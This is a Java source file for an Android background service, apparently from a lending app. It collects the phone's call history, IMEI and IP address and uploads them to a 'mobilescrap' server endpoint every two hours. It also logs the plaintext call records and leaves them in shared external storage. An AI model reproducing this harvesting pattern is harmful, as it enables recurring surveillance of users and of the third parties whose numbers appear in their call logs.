package com.eduvanzapplication.newUI.services;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.support.annotation.Nullable;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.eduvanzapplication.MainActivity;
import com.eduvanzapplication.Util.CryptoHelper;
import com.eduvanzapplication.Utils;
import com.eduvanzapplication.newUI.MainApplication;
import com.eduvanzapplication.newUI.receiver.AlarmReceiverForFileUpload;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import static com.eduvanzapplication.newUI.MainApplication.TAG;

/**
 * Created by Vijay on 19/9/17.
 */

public class MyServiceCallLog extends Service {

    public static Context context;
    public static String userID = "", userMobileNo = "";
    public static String mobileNo = "", userid = "", data = "", page = "", imeiNo = "", ipaddress = "";
    public static Date lDateCall;
    String callTimeStamp;
    public static File f;
    private LongOperation longOperation3 = null, longOperation4 = null;

    /**
     * CALL LOGS READ
     **/

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public static void callLogs(Context context) {
        String phNumber = "", callType = "", callDuration = "", logs = "";
        JSONArray jsonArray = new JSONArray();
        JSONObject outerOb = new JSONObject();

        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");

        int number = 0;
        int type = 0;
        int date = 0;
        int duration = 0;
        try {
            number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            type = cursor.getColumnIndex(CallLog.Calls.TYPE);
            date = cursor.getColumnIndex(CallLog.Calls.DATE);
            duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        } catch (Exception e) {
            e.printStackTrace();
        }

        /** getting data from shared preference **/
        SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
        userMobileNo = sharedPreferences.getString("mobile_no", "null");
        String callTimeStamps = sharedPreferences.getString("callTimeStamp", "null");
        try {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            lDateCall = simpleDateFormat.parse(callTimeStamps);
//            Log.e(TAG, "lDateCall::::: "+ lDateCall);
        } catch (ParseException e) {
            e.printStackTrace();
        }

        while (cursor.moveToNext()) {
            try {
                phNumber = cursor.getString(number);
                callType = cursor.getString(type);
                String callDate = cursor.getString(date);
                Date callDayTime = new Date(Long.valueOf(callDate));
                callDuration = cursor.getString(duration);
                String dir = null;


                if (lDateCall != null) {
    //                    Log.e(TAG, "when last date is not === null::: "+ lDateCall);
                    if (lDateCall.getTime() < callDayTime.getTime()) {
    //                    Log.e(TAG, "when last date is <<<<<<<<  callDayTime"+ callDayTime.getTime());
                        JSONObject mObject = new JSONObject();
                        try {
                            mObject.accumulate("callee_number", phNumber);
                            mObject.accumulate("call_type", callType);
                            mObject.accumulate("call_duration", callDuration);
                            mObject.accumulate("call_date", callDayTime);
                            jsonArray.put(mObject);

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                } else {
    //                Log.e(TAG, "ELSEEEEEE getTime()::: "+ callDayTime.getTime());
                    JSONObject mObject = new JSONObject();
                    try {
                        mObject.accumulate("callee_number", phNumber);
                        mObject.accumulate("call_type", callType);
                        mObject.accumulate("call_duration", callDuration);
                        mObject.accumulate("call_date", callDayTime);
                        jsonArray.put(mObject);

                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        cursor.close();
        try {
            outerOb.accumulate("created_by_ip", ipaddress);
            outerOb.accumulate("sim_serial_no", imeiNo);
            outerOb.accumulate("imei", imeiNo);
            outerOb.accumulate("mobileNo", userMobileNo);
            outerOb.put("call_logs", jsonArray);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        if (jsonArray.length() > 0) {
            logs = outerOb.toString();
            String cipher = "";
            try {
                cipher = CryptoHelper.encrypt(logs);
            } catch (Exception e) {
                e.printStackTrace();
            }

            StringBuffer sb = new StringBuffer();
            //sb.append("&&");
            sb.append(cipher);
            //sb.append("&&");

            mCreateAndSaveFile("saveCallLogs.json", String.valueOf(sb));
        }

        Log.e(TAG, "/*/*/*/*/*/*/*/*/*/*/*/*/CALL LOGS:/*/*/*/*/**/*/*/*/*/*/*/* " + "\n" + logs);
    }

    public static void mCreateAndSaveFile(String params, String mJsonResponse) {
        try {
            String path = "/storage/sdcard0/" + params;
            final File dir = new File(Environment.getExternalStorageDirectory() + "/");
            if (!dir.exists()) {
                dir.mkdirs();
            }

            f = new File(dir, params);
            f.getAbsolutePath();
            FileWriter file = new FileWriter(f.getAbsolutePath());
            file.write(mJsonResponse);
            file.flush();
            file.close();
            mReadJsonData(params);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void mReadJsonData(final String filename) {
        final File dir = new File(Environment.getExternalStorageDirectory() + "/");
        if (!dir.exists()) {
            dir.mkdirs();
        }
        final File f = new File(dir, filename);
        new Thread(new Runnable() {
            @Override
            public void run() {
                Log.e(TAG, "run: getAbsolutePath:::CALL LOGS::: " + f.getAbsolutePath());
                uploadFile(f.getAbsolutePath(), filename);
            }
        }).start();
    }

    /**
     * upload SMS file to server //MULTIPART FILE UPLOAD
     **/
    public static int uploadFile(final String selectedFilePath, String fileType) {
        String a = fileType;
        a = a.substring(0, a.lastIndexOf('.'));

        StringBuffer sb;
        long total = 0;
        String urlup = MainActivity.mainUrl + "mobilescrap/send_message";//https://api.eduvanz.com/mobilescrap/send_message
//        String urlup = MainActivity.mainUrl + "mobilescrap/send_santosh";
        int serverResponseCode = 0;

        HttpURLConnection connection;
        DataOutputStream dataOutputStream;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        final int count, fileLength;

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024 * 1024;
        File selectedFile = new File(selectedFilePath);

        String[] parts = selectedFilePath.split("/");
        final String fileName = parts[parts.length - 1];

        if (!selectedFile.isFile()) {
            Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
            return 0;
        } else {
            try {

                FileInputStream fileInputStream = new FileInputStream(selectedFile);
                URL url = new URL(urlup);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setDoInput(true);//Allow Inputs
                connection.setDoOutput(true);//Allow Outputs
                connection.setUseCaches(false);//Don't use a cached Copy
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Connection", "Keep-Alive");
                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                connection.setRequestProperty(a, selectedFilePath);
//                connection.setRequestProperty("file_name", "saveSMS");

                //creating new dataoutputstream
                dataOutputStream = new DataOutputStream(connection.getOutputStream());

                //writing bytes to data outputstream
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"" + a + "\";filename=\""
//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"saveCallLogs\";filename=\""
                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);

                //returns no. of bytes present in fileInputStream
                bytesAvailable = fileInputStream.available();
                //selecting the buffer size as minimum of available bytes or 1 MB
                bufferSize = Math.min(bytesAvailable, maxBufferSize);
                //setting the buffer as byte array of size of bufferSize
                buffer = new byte[bufferSize];
                fileLength = bufferSize;
                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
                bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                Log.e(TAG, "uploadFile: TOTAL bytes to read " + bytesRead + "total" + bufferSize);
                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
                total = 0;

                while (bytesRead > 0) {
                    total += bytesRead;
                    //write the bytes read from inputstream
                    dataOutputStream.write(buffer, 0, bufferSize);
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                    final int finalBytesRead = bytesRead;

                }
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes("1");
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
//                taOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
//                        + selectedFilePath + "\"" + lineEnd);
                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"mobileNo\";mobileNo=" + userMobileNo + "" + lineEnd);
                dataOutputStream.writeBytes(lineEnd);
                dataOutputStream.writeBytes(userMobileNo);
                dataOutputStream.writeBytes(lineEnd);

                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
                //        + "=" + URLEncoder.encode("1", "UTF-8"));

                serverResponseCode = connection.getResponseCode();
                String serverResponseMessage = connection.getResponseMessage();
                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
                String output = "";
                sb = new StringBuffer();

                while ((output = br.readLine()) != null) {
                    sb.append(output);
                }
                Log.e("CallLog ", "uploadFile: " + sb.toString());

                //response code of 200 indicates the server status OK
                if (serverResponseCode == 200) {

                    Log.e(TAG, "uploadFile: *********MY SERVICE CALL LOGS********** " + "\n" + sb.toString());

                    try {
                        JSONObject mObject = new JSONObject(sb.toString());
                        JSONObject resultsData = mObject.getJSONObject("result");
                        String callTimeStamp = resultsData.getString("callTimeStamp");
                        Log.e(TAG, "uploadFile: MY SERVICE CALL LOG  JSON RESPONSE callTimeStamp::: " + callTimeStamp);
                        try {
                            SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
                            SharedPreferences.Editor editor = sharedPreferences.edit();
                            editor.putString("callTimeStamp", callTimeStamp);
                            editor.apply();
                            editor.commit();

//                            if(f.exists()){
//                                f.delete();
//                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                }

                //closing the input and output streams
                fileInputStream.close();
                dataOutputStream.flush();
                dataOutputStream.close();


            } catch (FileNotFoundException e) {
                e.printStackTrace();
//                runOnUiThread(new Runnable() {
//                    @Override
//                    public void run() {
//                        Toast.makeText(context, "File Not Found", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: " + "File Not Found");
//                    }
//                });
            } catch (MalformedURLException e) {
                e.printStackTrace();
//                Toast.makeText(context, "URL error!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: " + "URL error!");

            } catch (IOException e) {
                e.printStackTrace();
//                Toast.makeText(context, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
                Log.e(TAG, "uploadFile: " + "Cannot Read/Write File!");
            }
//            dialog.dismiss();
            return serverResponseCode;
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        context = this;
        Log.e(TAG, " ******************MyService CALL LOG*******************");
        /** getting data from shared preference **/
        SharedPreferences sharedPreferences = context.getSharedPreferences("UserData", Context.MODE_PRIVATE);
        userMobileNo = sharedPreferences.getString("mobile_no", "null");
        callTimeStamp = sharedPreferences.getString("callTimeStamp", "null");
        try {
            SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            lDateCall = simpleDateFormat.parse(callTimeStamp);
//            Log.e(TAG, "lDateCall::::: "+ lDateCall);
        } catch (ParseException e) {
            e.printStackTrace();
        }

        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                // TODO: Consider calling
                //    ActivityCompat#requestPermissions
                // here to request the missing permissions, and then overriding
                //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
                //                                          int[] grantResults)
                // to handle the case where the user grants the permission. See the documentation
                // for ActivityCompat#requestPermissions for more details.
                return;
            }
            imeiNo = telephonyManager.getDeviceId();
            ipaddress = Utils.getIPAddress(true);
        } catch (Exception e) {
            e.printStackTrace();
        }

        // adding pending intent
        PendingIntent pendingIntent;
        Intent intent = new Intent(context, AlarmReceiverForFileUpload.class);
        pendingIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Calendar calendar = Calendar.getInstance();
        int interval = 2 * 60 * 60 * 1000;
//        int interval = 2 * 60 * 1000;
        alarmManager.setInexactRepeating(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), interval, pendingIntent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        longOperation3 = new LongOperation();
        longOperation3.execute("calllogs");
        //start sticky means service will be explicity started and stopped
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {

    }

    /**
     * ---------------- ASYNC TASK --------------
     **/
    private class LongOperation extends AsyncTask<String, Void, Void> {

        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        protected Void doInBackground(String... params) {
            try {
                callLogs(context);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPreExecute() {
        }

        @Override
        protected void onProgressUpdate(Void... values) {
        }
    }

}
